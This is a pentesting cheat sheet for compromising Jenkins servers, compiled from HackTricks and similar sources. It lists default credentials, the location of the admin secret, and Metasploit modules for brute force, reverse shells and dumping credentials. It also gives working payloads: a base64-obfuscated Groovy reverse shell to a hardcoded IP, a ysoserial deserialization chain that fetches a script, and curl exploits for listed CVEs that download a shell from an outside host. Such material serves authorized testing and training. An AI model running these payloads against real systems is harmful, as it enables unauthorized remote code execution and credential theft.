# Jenkins

Default ports: `8080/tcp` and `8443/tcp`

Path of the ile with credentials: `/var/lib/jenkins/secrets/initialAdminPassword`

## Default credentials

|Username|Password|
|:--|:--|
|admin|password|
|admin|admin|
|root|root|
|root|password|
|admin|admin1|
|admin|password1|
|root|password1|

## Enumeration with msf

```msf
use auxiliary/scanner/http/jenkins_enum
use auxiliary/scanner/http/jenkins_command
```

## Brute force with msf

```msf
use auxiliary/scanner/http/jenkins_login
```

## Execute Groovy script

Target: `http://TARGET_IP/path_jenkins/script`

### Exec code

```java
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```

### Reverse shell in linux

```java
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

## Reverse shell with msf

```msf
use exploit/multi/http/jenkins_script_console
```

## Dump Jenkins credentials

```msf
post/multi/gather/jenkins_gather
```

## RCE - Vulnerability

|Type of vuln|Version|CVE|
|:-|:-|:-|
|Deserialization|Jenkins <1.638|CVE-2015-8103|
|Authentication/ACL bypass|Jenkins <2.150.1|CVE-2018-1000861|
|Metaprogramming ||CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002|
|CheckScript ||CVE-2019-1003029, CVE-2019-1003030|
||Git plugin <3.12.0|CVE-2019-10392|

### CVE-2015-8103

```bash
java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.sh' > payload.out
./jenkins_rce.py TARGET_IP TARGET_PORT payload.out
```

### CVE-2018-1000861

Check if vulnerable:

```bash
curl -k -4 -s 'https://TARGET_IP/securityRealm/user/admin/search/index?q=a'
```

### CVE-2019-1003029, CVE-2019-1003030

Check if vulnerable:

```bash
curl -k -4 -X POST "https://TARGET_IP/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){sleep(5000)}}'
```

Exploit RCE

```bash
curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget xx.xx.xx.xx/shell.txt".execute()}}'
```

### CVE-2019-10392

```bash
jenkins_dump_builds.py -u USER -p PASSWORD https://TARGET_IP
```

## Set of tools

<https://github.com/gquere/pwn_jenkins>

## Source

- <https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#reverse-shell-in-linux>
- <https://github.com/gquere/pwn_jenkins>
- <https://pentestbook.six2dez.com/enumeration/webservices/jenkins>
- <https://blog.pentesteracademy.com/jenkins-ci-unauthenticated-rce-69e0651621b>
